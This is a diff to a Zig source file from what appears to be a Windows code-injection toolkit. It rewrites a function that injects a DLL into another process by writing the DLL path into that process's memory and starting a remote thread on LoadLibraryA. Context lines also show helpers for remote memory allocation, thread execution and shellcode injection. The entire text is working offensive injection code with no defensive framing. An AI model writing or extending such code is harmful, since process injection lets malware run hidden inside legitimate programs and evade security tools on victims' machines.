@@ -1,5 +1,6 @@
 const std = @import("std");
 const win = @import("zigwin32").everything;
+const loadFunction = @import("../common.zig").loadFunction;
 
 const HANDLE = win.HANDLE;
 const PAGE_PROTECTION_FLAGS = win.PAGE_PROTECTION_FLAGS;
@@ -22,6 +23,7 @@ const QueueUserAPC = win.QueueUserAPC;
 const CreateFileMappingA = win.CreateFileMappingA;
 const MapViewOfFile = win.MapViewOfFile;
 const MapViewOfFile2 = win.MapViewOfFileNuma2;
+const FreeLibrary = win.FreeLibrary;
 
 pub fn allocateMemory(comptime T: type, h_process: HANDLE, data: []const T) !*anyopaque {
     const data_size = (data.len + 1) * @sizeOf(T);
@@ -94,24 +96,14 @@ pub fn executeInNewThread(h_process: HANDLE, start_address: LPTHREAD_START_ROUTI
     _ = WaitForSingleObject(h_thread, INFINITE);
 }
 
-pub fn loadDllIntoProcess(allocator: std.mem.Allocator, h_process: HANDLE, dll_path: []const u8) !void {
-    const h_kernel32 = GetModuleHandleA("kernel32.dll") orelse {
-        std.debug.print("[!] GetModuleHandleW Failed With Error: {s}\n", .{@tagName(GetLastError())});
-        return error.GetModuleHandleWFailed;
-    };
+pub fn loadDllIntoProcess(h_process: HANDLE, dll_path: []const u8) !void {
+    const load_library_a = try loadFunction(*anyopaque, "kernel32.dll", "LoadLibraryA");
+    defer _ = FreeLibrary(load_library_a.h_module);
 
-    const load_library_w = GetProcAddress(h_kernel32, "LoadLibraryW") orelse {
-        std.debug.print("[!] GetProcAddress Failed With Error: {s}\n", .{@tagName(GetLastError())});
-        return error.GetProcAddressFailed;
-    };
-
-    const dll_path_utf16 = try std.unicode.utf8ToUtf16LeAllocZ(allocator, dll_path);
-    defer allocator.free(dll_path_utf16);
-
-    const remote_dll_path_ptr = try allocateMemory(u16, h_process, dll_path_utf16);
+    const remote_dll_path_ptr = try allocateMemory(u8, h_process, dll_path);
     defer freeVirtualMemory(h_process, remote_dll_path_ptr);
 
-    try executeInNewThread(h_process, @ptrCast(load_library_w), remote_dll_path_ptr);
+    try executeInNewThread(h_process, @ptrCast(load_library_a.func), remote_dll_path_ptr);
 }
 
 pub fn injectShellCodeToProcess(h_process: HANDLE, shell_code: []const u8) !void {
